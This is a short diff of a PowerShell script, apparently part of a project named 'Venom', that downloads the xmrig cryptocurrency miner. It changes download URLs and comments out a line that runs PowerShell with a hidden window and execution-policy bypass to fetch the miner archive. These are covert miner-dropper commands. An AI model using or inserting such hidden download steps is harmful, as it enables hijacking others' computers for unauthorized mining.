@@ -68,9 +68,9 @@ cd $wd
 $currentDirectory = $PWD
 
 # Download the ZIP file
-# Invoke-WebRequest -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig-6.22.2-gcc-win64.zip" -OutFile "xmrig-6.22.2-gcc-win64.zip"
+# Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
 
-powershell -windowstyle hidden -ep bypass curl -o "/home/kali/Documents/xmrig-6.22.2-msvc-win64.zip" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip 
+#powershell -windowstyle hidden -ep bypass curl -o "/home/kali/Documents/xmrig-6.22.2-msvc-win64.zip" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip 
 
 # Extract the ZIP file in the current directory
 #Expand-Archive -Path "$currentDirectory\xmrig-6.22.2.zip" -DestinationPath $currentDirectory
